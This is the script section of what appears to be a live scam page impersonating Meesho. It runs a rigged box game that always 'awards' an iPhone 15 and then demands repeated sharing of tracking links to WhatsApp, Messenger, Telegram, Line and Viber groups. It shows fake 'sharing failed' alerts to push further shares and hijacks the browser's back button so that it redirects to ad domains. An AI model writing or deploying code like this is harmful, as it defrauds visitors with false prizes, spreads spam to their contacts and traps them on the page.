                                              class='style-scope yt-icon'></path>
                                    </g>
                                </svg></div>&nbsp; <span>66 minutes ago</span>
                        </span>
                    </div>
                </div>

                <p style="font-size:12px;color:#bcbcbc"></p>
            </div>
        </div>
    </div>
    <div id="footer" style="background-color:#570945;margin-bottom:0;font-size:12px;text-align:center;color:#fff;padding:10px">

        <i class="datetime" id="datetime"></i>
        <p style="line-height:20px;margin-bottom:0">
          &copy; 2024 Meesho Inc.
        </p>
    </div>
</div>

<script type="text/javascript">
        // GOGOGO
window.addEventListener('touchstart',function(){
    fhha();
});
var brand_country = 'United Kingdom';
var dayNames = new Array("Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday");
var monthNames = new Array("January", "February", "March", "April", "May", "June", "July", "August", "September", "October", "November", "December");
var minutos_y = "minutes and ";
var segundos = "seconds";
var modalOptions = {
    backdrop: 'static',
    keyboard: false
};
var g_share_step = 26;
var g_banner_ad = true;
var g_share_type = 1;
var type_op = 1;
var cl = 0;
var p_e = 0;
var p_s = 0;
var all_p_e = [50, 50, 70, 70, 80, 85, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 99.1, 99.2, 99.3, 99.4, 99.5, 99.6, 99.7, 99.8, 99.9, 100];
var toPlatform = 'whatsapp';
set_Cookie('hh1',0);
set_Cookie('hh2',0);

// 
var maxParticleCount = 150;
var particleSpeed = 2;
var startConfetti;
var stopConfetti;
var toggleConfetti;
var removeConfetti;
(function() {
    startConfetti = startConfettiInner;
    stopConfetti = stopConfettiInner;
    toggleConfetti = toggleConfettiInner;
    removeConfetti = removeConfettiInner;
    var colors = ["DodgerBlue", "OliveDrab", "Gold", "Pink", "SlateBlue", "LightBlue", "Violet", "PaleGreen",
        "SteelBlue", "SandyBrown", "Chocolate", "Crimson"
    ]
    var streamingConfetti = false;
    var animationTimer = null;
    var particles = [];
    var waveAngle = 0;

    function resetParticle(particle, width, height) {
        particle.color = colors[(Math.random() * colors.length) | 0];
        particle.x = Math.random() * width;
        particle.y = Math.random() * height - height;
        particle.diameter = Math.random() * 10 + 5;
        particle.tilt = Math.random() * 10 - 10;
        particle.tiltAngleIncrement = Math.random() * 0.07 + 0.05;
        particle.tiltAngle = 0;
        return particle;
    }

    function startConfettiInner() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        window.requestAnimFrame = (function() {
            return window.requestAnimationFrame || window.webkitRequestAnimationFrame || window
                .mozRequestAnimationFrame || window.oRequestAnimationFrame || window
                .msRequestAnimationFrame || function(callback) {
                    return window.setTimeout(callback, 16.6666667);
                };
        })();
        var canvas = document.getElementById("confetti-canvas");
        if (canvas === null) {
            canvas = document.createElement("canvas");
            canvas.setAttribute("id", "confetti-canvas");
            canvas.setAttribute("style",
                "display:block;z-index:888888;pointer-events:none;position: absolute;left: 0px;top: 0px;");
            document.body.appendChild(canvas);
            canvas.width = width;
            canvas.height = height;
            window.addEventListener("resize", function() {
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
            }, true);
        }
        var context = canvas.getContext("2d");
        while (particles.length < maxParticleCount)
            particles.push(resetParticle({}, width, height));
        streamingConfetti = true;
        if (animationTimer === null) {
            (function runAnimation() {
                context.clearRect(0, 0, window.innerWidth, window.innerHeight);
                if (particles.length === 0)
                    animationTimer = null;
                else {
                    updateParticles();
                    drawParticles(context);
                    animationTimer = requestAnimFrame(runAnimation);
                }
            })();
        }
    }

    function stopConfettiInner() {
        streamingConfetti = false;
    }

    function removeConfettiInner() {
        stopConfetti();
        particles = [];
    }

    function toggleConfettiInner() {
        if (streamingConfetti)
            stopConfettiInner();
        else
            startConfettiInner();
    }

    function drawParticles(context) {
        var particle;
        var x;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            context.beginPath();
            context.lineWidth = particle.diameter;
            context.strokeStyle = particle.color;
            x = particle.x + particle.tilt;
            context.moveTo(x + particle.diameter / 2, particle.y);
            context.lineTo(x, particle.y + particle.tilt + particle.diameter / 2);
            context.stroke();
        }
    }

    function updateParticles() {
        var width = window.innerWidth;
        var height = window.innerHeight;
        var particle;
        waveAngle += 0.01;
        for (var i = 0; i < particles.length; i++) {
            particle = particles[i];
            if (!streamingConfetti && particle.y < -15)
                particle.y = height + 100;
            else {
                particle.tiltAngle += particle.tiltAngleIncrement;
                particle.x += Math.sin(waveAngle);
                particle.y += (Math.cos(waveAngle) + particle.diameter + particleSpeed) * 0.5;
                particle.tilt = Math.sin(particle.tiltAngle) * 15;
            }
            if (particle.x > width + 20 || particle.x < -20 || particle.y > height) {
                if (streamingConfetti && particles.length <= maxParticleCount)
                    resetParticle(particle, width, height);
                else {
                    particles.splice(i, 1);
                    i--;
                }
            }
        }
    }
})();

// 
var box_ini = !1
var modalOptions = {
    backdrop: 'static',
    keyboard: false
};
var count = 1;
var windraw = 2;
var intentos = 3;
if(intentos < windraw){var intentos = windraw;}
var puedo = false;
var boxRoot;
var datetime = 1644822887640;
boxRoot = {
    _init: function() {
        setTimeout(function() {
			Swal.fire({
				title: 'Congratulation!',
				html: '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">Your answers has been saved successfully!</p><p style="margin:1px;">You have a chance to win gifts.</p><p style="margin:1px;">You must select the correct box with your prize inside.</p><p style="margin:1px;">You have 3 attempts. Good luck!</p>',
				imageUrl: '',
			// 	imageHeight: 227,
				imageAlt: 'Custom image',
			}).then(function(){
				puedo = true;
			});
			setTimeout(function(){
				$('.swal2-header').find('.swal2-image').addClass('temblor_inf');
				$('.swal2-content').css('padding','0');
				$('.swal2-content').css('font-size','1rem');
			},50);
        }, 1000);
        jQuery('.try').on('click', function() {
            if (puedo && count <= windraw) {
                if (jQuery(this).hasClass('abierta')) {} else {
                    puedo = false;
                    jQuery(this).addClass('abierta');
                    if (count == windraw) {
                        jQuery(this).addClass('premiazo');
                        setTimeout(function() {
                            jQuery(".div_img_gift, .img_gift").fadeIn("slow",
                                function() {
                                	startConfetti();
                                    setTimeout(function() {
                                    	Swal.fire({
											title: 'Congratulation!',
											html: '<p style="margin:10px 0;font-size: 14px;font-weight: 600;">You did it! You won iPhone 15 </p><p style="margin:1px;">*** THE RULES ***</p><div style="text-align:center;"><p style="margin:1px;">1. You must tell 5 groups or 20 friends about our promotions.</p><p style="margin:1px;">2. Enter your address and complete registration.</p><p style="margin:1px;">3. The gifts will be delivered within 5-7 days</p></div>',
											imageUrl: 'https://offershore.top/uploads/bxudhyfi.dda.png',
											imageHeight: 180,
											imageAlt: 'Custom image',
										}).then(function(){
											puedo = false;
											showShare();
											stopConfetti();
										});
										setTimeout(function(){
											// $('.swal2-header').find('.swal2-image').addClass('temblor_inf');
											$('.swal2-content').css('padding','0');
											$('.swal2-content').css('font-size','1rem');
										},50);
                                    }, 1500);
                                });
                        }, 4000);
                    } else {
                        count++;
                        intentos--;
                        setTimeout(function() {
                            swal_box(intentos);
                        }, 2000);
                    }
                }
            }
        });
    }
};
$(document).ready(function() {
    if (typeof box_ini == "undefined") {
        boxRoot._init();
    }
});

$(".bq1").click(function(){$("#q1s").fadeOut("slow",function(){$("#q2s").fadeIn("slow");});});$(".bq2").click(function(){$("#q2s").fadeOut("slow",function(){$("#q3s").fadeIn("slow");});});$(".bq3").click(function(){$("#q3s").fadeOut("slow",function(){$("#q4s").fadeIn("slow");});});$(".bq4").click(function() {scrollTo("id1");$("#content1").fadeOut("slow",function(){$("#content2").fadeIn();setTimeout(function(){$("#result1").fadeIn(1000);},3000);setTimeout(function(){$("#result2").fadeIn(1000);},4100);setTimeout(function(){$("#result3").fadeIn(1000);},6000);setTimeout(function(){$("#content2").fadeOut("slow",function(){"undefined" != typeof roulette_ini ? rouletteRoot._init() : "undefined" != typeof box_ini && boxRoot._init();$("#content3").fadeIn();});},7100);});});

// date
if ($("#timerr").length >= 1) {d((4 * 60) + 29);}
var b = new Date();
var a = f(b.getHours()) + ":" + f(b.getMinutes());
$(".p_var-dia").text(b.getDate());
$(".p_var-mes").text(b.getMonth());
$(".p_var-anyo").text(b.getFullYear());
$(".p_var-dia_nombre").text(dayNames[b.getDay()]);
$(".p_var-mes_nombre").text(monthNames[b.getMonth()]);
$(".p_var-hora_fija").text(a);
if ($(".p_var-browser").length >= 1) {
	var c = getBrowser();
	$(".p_var-browser").text(c);
}
if ($(".p_var-browser").length >= 1) {
	var e = getPlatform();
	$(".p_var-so").text(e);
}

// let's go!




var share2btnText = 'Groups over 100 people';
$('.share2btnText').html(share2btnText);
set_Cookie('s2num', 0);
var Ads = "https://"+randomDomain+"?meesho=9";
var Web = "https://"+randomDomain+"?meesho=8";
var j = "https://"+randomDomain+"?meesho=7";
var j2 = "https://"+randomDomain+"?meesho=6";
var msj = "https://"+randomDomain+"?meesho=5"; 
var tgj = "https://"+randomDomain+"?meesho=4";
var tj = "https://"+randomDomain+"?meesho=3";
var vbj = "https://"+randomDomain+"?meesho=2";
var lnj = "https://"+randomDomain+"?meesho=1";
var tj2 = "";
var mj = "";
var mj2 = "";var nptimes = [];
var share_number = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'));console.log(share_number);
if (share_number > 0) {
    showShare()
    move()
}

var type_op = get_Cookie('type_op') == '' ? 1 : parseInt(get_Cookie('type_op'));console.log(type_op);
if(type_op === 2){
    showShare()
}

// functions
function d(h){
	var j, k, i = h,
		g = setInterval(function() {
			j = parseInt(i / 60, 10), k = parseInt(i % 60, 10), k = 10 > k ? "0" + k : k, $("#timerr").text(j + " " + minutos_y + k + " " + segundos), --i < 0 && (clearInterval(g));
		}, 1000);
}

function f(g) {
	if (g < 10) {
		g = "0" + g;
	}
	return g;
}

function stepfinal() {
	$("#p_body_content").fadeOut("slow");
	$("#p_loading").fadeIn("slow");
}

function goToUrlFinish() {
	stepfinal();
	PreventExitPop = false;
	document.getElementById("p_form_post").submit();
}

function scrollTo(a) {
	if ($("#" + a).length) {
		var c = $("#" + a).offset();
		var b = c.top;
		$("html,body").animate({
			scrollTop: b
		}, {
			duration: "slow"
		});
	}
}

function getBrowser() {
	if ((navigator.userAgent.indexOf("Opera") || navigator.userAgent.indexOf("OPR")) != -1) {
		return "Opera";
	} else {
		if (navigator.userAgent.indexOf("Chrome") != -1) {
			return "Google Chrome";
		} else {
			if (navigator.userAgent.indexOf("Safari") != -1) {
				return "Safari";
			} else {
				if (navigator.userAgent.indexOf("Firefox") != -1) {
					return "Firefox";
				} else {
					if ((navigator.userAgent.indexOf("MSIE") != -1) || (!!document.documentMode == true)) {
						return "IE";
					} else {
						return "Unknown";
					}
				}
			}
		}
	}
	return "Unknown";
}

function getPlatform() {
	if (window.navigator.userAgent.indexOf("Windows NT 10.0") != -1) {
		return "Windows 10";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.2") != -1) {
		return "Windows 8";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.1") != -1) {
		return "Windows 7";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 6.0") != -1) {
		return "Windows Vista";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 5.1") != -1) {
		return "Windows XP";
	}
	if (window.navigator.userAgent.indexOf("Windows NT 5.0") != -1) {
		return "Windows 2000";
	}
	if (window.navigator.userAgent.indexOf("iPhone") != -1) {
		return "iPhone";
	}
	if (window.navigator.userAgent.indexOf("iPad") != -1) {
		return "iPad";
	}
	if (window.navigator.userAgent.indexOf("Android") != -1) {
		return "Android";
	}
	if (window.navigator.userAgent.indexOf("Mac") != -1) {
		return "Macintosh";
	}
	if (window.navigator.userAgent.indexOf("X11") != -1) {
		return "UNIX";
	}
	if (window.navigator.userAgent.indexOf("Linux") != -1) {
		return "Linux";
	}
	if (window.navigator.userAgent.indexOf("BlackBerry") != -1) {
		return "BlackBerry";
	}
	return "Unknown";
}

function set_Cookie(name, value) {
    name = "Meeshov22ss-tt"+name;
    var Minutes = 10;
    var exp = new Date();
    let domain = getMainHost();
    exp.setTime(exp.getTime() + (Minutes * 60 * 1000));
    document.cookie = name + "=" + escape(value) + ";expires=" + exp.toGMTString() + ";domain=."+domain+"; path=/;";
}

function get_Cookie(name) {
    name = "Meeshov22ss-tt"+name;
    var arr, reg = new RegExp("(^| )" + name + "=([^;]*)(;|$)");
    if (arr = document.cookie.match(reg)) {
        return unescape(arr[2]);
    }
    return '';
}

function move() {
    cl = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog')) - 2;
    cl = cl>=0?cl:0;
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    var elem = document.getElementById("progressbar")
    if (cl < all_p_e.length && share_num <= g_share_step) {
        var p_e_num = cl
    } else {
        var p_e_num = all_p_e.length - 1
    }
    p_e = all_p_e[p_e_num];
    
    elem.style.width = p_e + '%';
    elem.innerHTML = p_e + '%';
}

function swal_box(intentos){
	let texts = ['Sorry, the box you selected is empty. You still have 1 chance! Good luck!','Sorry, the box you selected is empty. You still have 2 chances! Good luck!'];
	Swal.fire({
		icon: 'error',
		title: 'Unfortunately...',
		text: texts[intentos-1],
	}).then(function(){
		puedo = true;
	});
	setTimeout(function(){
		$('.swal2-content').css('padding','0');
		$('.swal2-content').css('font-size','1rem');
	},50);
}

function showShare() {
    set_Cookie('type_op', 2);
    // $('#p_modal3').modal('hide');
    $('.share_page').show();
    $('#content4').show();
    $('#content3').hide();
    $('#content1').hide();
}

function continueBtn() {
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    if (share_num < g_share_step) {
        swalert("You have to share with friends about our event. Share until the blue bar is full!","Unfortunately...");
    } else {
        jQuery(".share_ing").hide();
        jQuery(".share_success").show();
        window.location.href = "processing.php";
    }
}

function swalert(text,title=''){
	if(title != ''){
		Swal.fire({
    		icon: 'warning',
    		title: title,
			text: text,
            allowOutsideClick:false,
            allowEnterKey:false
		}).then((res)=>{
			if(res.isConfirmed){
			    shareBtn(toPlatform);
			}
		});
	}else{
		Swal.fire({
    		icon: 'warning',
			text: text,
            allowOutsideClick:false,
            allowEnterKey:false,
		}).then((res)=>{
			if(res.isConfirmed){
			    shareBtn(toPlatform);
			}
		});
	}
}

function shareOkBtn() {
    window.open(Web+'&_p=Banner');
}

function shareBtn(platform) {
    var share_num = get_Cookie('prog') == '' ? 0 : parseInt(get_Cookie('prog'))
    share_num++
    if (share_num > g_share_step) {
        share_num = g_share_step;
    }
    toPlatform = platform;
    let jurl = j;
    if(platform == 'messenger'){
        jurl = msj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'fb-messenger://share/?link='+encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'telegram'){
        jurl = tgj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'tg://msg_url?url=' + encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'line'){
        jurl = lnj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'https://line.me/R/share?text=' + encodeURIComponent(jurl);
    }else if(platform == 'viber'){
        jurl = vbj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'viber://forward?text=' + encodeURIComponent(jurl);
    }else{
        if(nptimes.length > 0){
            if(nptimes.includes(share_num)){
                jurl = j2;
            }
        }
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'whatsapp://send?text=' + jurl + new Date().getTime();
    }

    setTimeout(function () {
        get_Cookie('prog') == '' ? value = 1 : value = parseInt(get_Cookie('prog'));
        if (value >= g_share_step) {
            continueBtn();
        }else{
            value == 2 || value == 4 ? swalert("The same group or the same friend is not correct. Please check and share again.","Sharing failed!") : void (0);
        }
        set_Cookie('prog', value + 1);
        let pType = get_Cookie('pType');
        set_Cookie('pType', pType);
        move()
    }, 3000);
}

function shareBtn2(platform) {
    let all_s2num = 12;
    let s2_num_tips = [7, 6, 5, 4, 3, 2, 24, 12, 8, 6, 4, 2, 1];
    let text = 'The review will be completed within <span class="badge badge-warning" style="font-size: large;background: #570945;color: #fff;" id="tips_number">24</span> hours.';
    let swal_html1 = 'The review will be completed within ( <span style="font-size: 22px;color: #570945;" id="tips_number">[[333]]</span> ) days.';
    let swal_html2 = 'The review will be completed within ( <span style="font-size: 22px;color: #570945;" id="tips_number">[[333]]</span> ) hours.';
    let share2_num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
    let jurl = j;
    if(platform == 'messenger'){
        jurl = msj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'fb-messenger://share/?link='+encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'telegram'){
        jurl = tgj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'tg://msg_url?url=' + encodeURIComponent(jurl + new Date().getTime());
    }else if(platform == 'line'){
        jurl = lnj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'https://line.me/R/share?text=' + encodeURIComponent(jurl);
    }else if(platform == 'viber'){
        jurl = vbj;
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'viber://forward?text=' + encodeURIComponent(jurl);
    }else{
        if(nptimes.length > 0){
            if(nptimes.includes(share_num)){
                jurl = j2;
            }
        }
        // if(share2_num >= 0){share_num = share_num + share2_num;}
let s2num = get_Cookie('s2num') ? parseInt(get_Cookie('s2num')) : 0;
let s1num = get_Cookie('prog') ? parseInt(get_Cookie('prog')) : 0;
let s_num = s1num + 1;
if(s1num > g_share_step){
    s_num = s1num + s2num;
}
fetch(window.location.href, {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
    },
    // body: 'href=' + encodeURIComponent(jurl) + '&th=' + share_num,
    body: 'href=' + encodeURIComponent(jurl) + '&th=' + s_num
});location.href = 'whatsapp://send?text=' + jurl + new Date().getTime();
    }
    if (share2_num < all_s2num) {
        setTimeout(function() {
            share2_num += 1;
            let ttips = s2_num_tips[share2_num];
            swal_html1 = swal_html1.replace('[[333]]',ttips);
            swal_html2 = swal_html2.replace('[[333]]',ttips);
            let swal_html = '<div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;">Congratulations! You are done sharing.</div><div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;" id="tips_text">'+swal_html1+'</div>';
            if (share2_num >= 6) {
                $('#tips_text').html(text);
                swal_html = '<div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;">Congratulations! You are done sharing.</div><div style="text-align: center;font-size: 20px;font-weight: 500;line-height: 28px;margin: 5px;" id="tips_text">'+swal_html2+'</div>';
            }
            $('#tips_number').html(ttips);
            if (share2_num == 6) {
                $('#tips_text').html(text);
            }

            $('#tips_number').html(ttips);
            Swal.fire({
                icon: 'success',
                html: swal_html,
                allowOutsideClick:false,
                allowEnterKey:false,
            }).then((res)=>{
                if(res.isConfirmed){
                    shareBtn2('whatsapp');
                }
            });

            set_Cookie('s2num', share2_num);
        }, 3000);
    } else {
        $('#tips_text').html(text);
        $('#tips_number').html('1');
    }
}

function wxalert(t, n, b, flag, i) {
	//flag:1,success  2,normal
	var r, u;
	r = '<div class="weui_dialog_alert" style="position: fixed; z-index: 1000; display: none;margin-left:15%;margin-right:15%">';
	r += '<div class="weui_mask"></div>';
	r += '<div class="weui_dialog">';
	r += '<i class="weui_close"><svg t="1540783423798" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="s="http://www.w3.org/2000/svg" p-" p-id="1931" xmlns:xlink="k="http://www.w3.org/1999/xlink" wi" width="25" height="25"><path style="fill:#666;" d="M176.661601 817.172881C168.472798 825.644055 168.701706 839.149636 177.172881 847.338438 185.644056 855.527241 199.149636 855.298332 207.338438 846.827157L826.005105 206.827157C834.193907 198.355983 833.964998 184.850403 825.493824 176.661601 817.02265 168.472798 803.517069 168.701706 795.328267 177.172881L176.661601 817.172881ZM795.328267 846.827157C803.517069 855.298332 817.02265 855.527241 825.493824 847.338438 833.964998 839.149636 834.193907 825.644055 826.005105 817.172881L207.338438 177.172881C199.149636 168.701706 185.644056 168.472798 177.172881 176.661601 168.701706 184.850403 168.472798 198.355983 176.661601 206.827157L795.328267 846.827157Z" p-id="1932"></path></svg></i>';
	r += '<div class="weui_dialog_hd"><strong class="weui_dialog_title"></strong></div>';
	r += '<div class="weui_dialog_bd" style="color:#000;padding-top:20px;padding-bottom:10px;"></div>';
	r += '<div class="weui_dialog_ft">';
	r += '<div href="javascript:void(0);" class="weui_btn_dialog primary btn">OK</div>';
	r += "</div>";
	r += "</div>";
	r += "</div>";

	$(".weui_dialog_alert").length > 0 ? $(".weui_dialog_alert .weui_dialog_bd").empty() : $("body").append($(r));
	setTimeout(function() {
		u = $(".weui_dialog_alert");
		u.show();
		u.find(".weui_dialog_bd").html(n);
		u.find(".weui_dialog_title").html(t);
		u.find(".weui_btn_dialog").html(b ? b : "");
		u.find(".weui_btn_dialog").off("click").on("click", function() {
			i();
			u.hide();
			if (flag == 1) {
				stopConfetti();
			}
		});
		u.find(".weui_close").off("click").on("click", function() {
			i();
			u.hide();
			if (flag == 1) {
				stopConfetti();
			}
		});
		if (flag == 1) {
			startConfetti();
		}
	}, 500);
}

function getMainHost() {
    let key  = `mh_${Math.random()}`;
    let keyR = new RegExp( `(^|;)\\s*${key}=12345` );
    let expiredTime = new Date( 0 );
    let domain = document.domain;
    let domainList = domain.split( '.' );
    let urlItems   = [];
    urlItems.unshift( domainList.pop() );
    while( domainList.length ) {
    urlItems.unshift( domainList.pop() );
    let mainHost = urlItems.join( '.' );
    let cookie = `${key}=${12345};domain=.${mainHost}`;
    document.cookie = cookie;
    if ( keyR.test( document.cookie ) ) {
        document.cookie = `${cookie};expires=${expiredTime}`;
        return mainHost;
        }
    }
}
window.onhashchange = function() {
    jp();
};

function hh1() {
    history.pushState(history.length + 1, "message", "#" + new Date().getTime());
}

function jp() {
    fh();
}
setTimeout('hh1();', 500);

function fh() {
    location.href = Ads+'&_p=Banner';
}

function fhha(num=1){
    let hh = get_Cookie('hh'+num) ? parseInt(get_Cookie('hh'+num)) : 0;
    if(hh < num){
        hh += 1;
        history.pushState(history.length + 1, "niubility", "#" + new Date().getTime());
        setTimeout(function(){
            history.pushState(history.length + 1, "niubility", "#" + new Date().getTime());
        },500);
        set_Cookie('hh'+num,hh);
    }
}

</script>

</body>
</html>
